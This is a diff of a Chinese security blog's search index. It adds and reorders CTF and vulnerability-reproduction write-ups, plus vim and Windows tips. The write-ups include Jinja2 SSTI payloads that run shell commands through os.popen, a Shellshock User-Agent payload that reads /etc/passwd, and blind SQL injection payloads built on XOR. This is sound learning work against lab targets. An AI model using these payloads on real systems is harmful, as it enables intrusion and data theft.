+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>方法3</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
@@ -3560,32 +3560,24 @@
       </tags>
   </entry>
   <entry>
-    <title>windows 上CD驱动器的删除问题</title>
-    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
+    <title>vim缩进问题</title>
+    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
 <span id="more"></span>
 <h1 id="问题描述">问题描述</h1>
-<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
-<p>删除也删不掉，打开也打开不了，很烦。</p>
-<h1 id="原因">原因</h1>
-<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
-<p>知道原因后，解决的办法就很简单了。</p>
-<h1 id="问题解决">问题解决</h1>
-<p>首先，以管理员方式打开 <code>UltraISO</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
-<p><code>选项 -&gt; 配置</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
-<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
-<p>然后即可看到 CD驱动器已经消失了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
+<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
+<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
+<h1 id="解决方案">解决方案</h1>
+<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
+<p>然后就可以成功运行脚本了。</p>
+<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
 ]]></content>
       <categories>
-        <category>Windows</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>Windows小知识</tag>
+        <tag>vim</tag>
       </tags>
   </entry>
   <entry>
@@ -3914,24 +3906,32 @@
       </tags>
   </entry>
   <entry>
-    <title>vim缩进问题</title>
-    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
+    <title>windows 上CD驱动器的删除问题</title>
+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
 <span id="more"></span>
 <h1 id="问题描述">问题描述</h1>
-<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
-<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
-<h1 id="解决方案">解决方案</h1>
-<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
-<p>然后就可以成功运行脚本了。</p>
-<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
 ]]></content>
       <categories>
-        <category>Linux</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>vim</tag>
+        <tag>Windows小知识</tag>
       </tags>
   </entry>
   <entry>
@@ -4139,34 +4139,6 @@
       </tags>
   </entry>
   <entry>
-    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
-    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
-<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
-<p>影响版本： - bash version &lt;= 4.3</p>
-<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
-<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
-<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
-<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
-<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>破壳漏洞</tag>
-        <tag>shellshock</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
     <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
     <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
@@ -4215,6 +4187,34 @@
       </categories>
       <tags>
         <tag>AppWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
+    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
+<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
+<p>影响版本： - bash version &lt;= 4.3</p>
+<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
+<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
+<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
+<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
+<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>破壳漏洞</tag>
+        <tag>shellshock</tag>
       </tags>
   </entry>
   <entry>
@@ -4310,6 +4310,35 @@
       </tags>
   </entry>
   <entry>
+    <title>攻防世界_shrine</title>
+    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
+    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
+<li>第二可以访问/shrine/xxx；</li>
+<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
+</ul>
+<p>查看是否存在SSTI：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
+<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
+<h1 id="解题">解题</h1>
+<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
+<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>强网杯 2019 高明的黑客</title>
     <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -4337,6 +4366,40 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战 2019 FinalSQL</title>
+    <url>/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5B极客大挑战%202019%5DFinalSQL">FinalSQL</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入页面，经过相关的测试，发现了三个可能的注入点：用户名、密码和点击数字小方框之后url出现的id。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png" /></p>
+<p>并且，根据最上面的提示，本题估计是sql盲注。</p>
+<h1 id="解题">解题</h1>
+<p>首先以为注入点在用户名和密码，就对其进行了模糊测试：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181744.png" /></p>
+<p>发现过滤了许多东西，而且无法绕过。后来找到了当输入<code>\</code>时，系统报错了，我欣喜若狂，以为这里就是注入点，并且之前还记录了[[过滤单引号的注入方法]]。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181822.png" /></p>
+<p>经过测试，这里确实存在着注入点，但是许多要使用的关键词都被过滤了，比如<code>or</code>、<code>and</code>等，导致无法绕过。</p>
+<p>之后我又去尝试了一下第三个可能的注入点，当我输入如下值时： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=1 # NO! Not this! Click others</span><br><span class="line">?id=1=2 # ERROR!!!</span><br></pre></td></tr></table></figure></p>
+<p>觉得这里存在着注入点，又经过了不断尝试，确定了注入点就在<code>id</code>，并且参数值正确的时候返回的就是该页面本来的内容，当参数值不正确的时候返回的就是<code>ERROR!!!</code>。</p>
+<p>随后我进行了模糊测试</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417182427.png" /></p>
+<p>（其中长度890的都是被过滤了）</p>
+<p>由于这里没有回显，因此尝试盲注（脚本建议自己写，这题的flag字段内容非常多，就离谱）。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库长度: </span><br><span class="line">	异或: ?id=0^(length(database())=4) </span><br><span class="line">	or: ?id=(0)or(length(database())=4) # 下面的也可以用or</span><br><span class="line"></span><br><span class="line">数据库名: ?id=0^(ascii(substr(database(),%d,1))=%d) -&gt; geek</span><br><span class="line"></span><br><span class="line">表名：?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d) -&gt; F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line">字段名: ?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;,%d,1))=%d) -&gt; id,username,password</span><br><span class="line"></span><br><span class="line">字段信息: ?id=0^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),%d,1))=%d)</span><br><span class="line">(最后非常的阴间！！！flag在最后面，所以我倒着求，如果正着，总共有200+个字符！！！)</span><br></pre></td></tr></table></figure></p>
+<hr />
+<p>这里解释一下异或： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^0 -&gt; 0</span><br><span class="line">0^1 -&gt; 1</span><br><span class="line">1^0 -&gt; 1</span><br><span class="line">1^1 -&gt; 0</span><br></pre></td></tr></table></figure></p>
+<p>以数据库长度的payload为例： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果这个为真(length(database())=4)，即值为1，那么?id=0^1=1，从而显示正确的页面内容。</span><br><span class="line">如果这个为假(length(database())=3)，即值为0，那么?id=0^0=0，从而显示错误的页面内容。</span><br></pre></td></tr></table></figure></p>
+<p>因此，当<code>or</code>和<code>and</code>都被过滤的时候，可以考虑一下异或。</p>
+<hr />
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -4395,35 +4458,6 @@
       <tags>
         <tag>反序列化</tag>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界_shrine</title>
-    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
-    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
-<li>第二可以访问/shrine/xxx；</li>
-<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
-</ul>
-<p>查看是否存在SSTI：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
-<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
-<h1 id="解题">解题</h1>
-<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
-<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>直接得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>Jinjia2</tag>
-        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
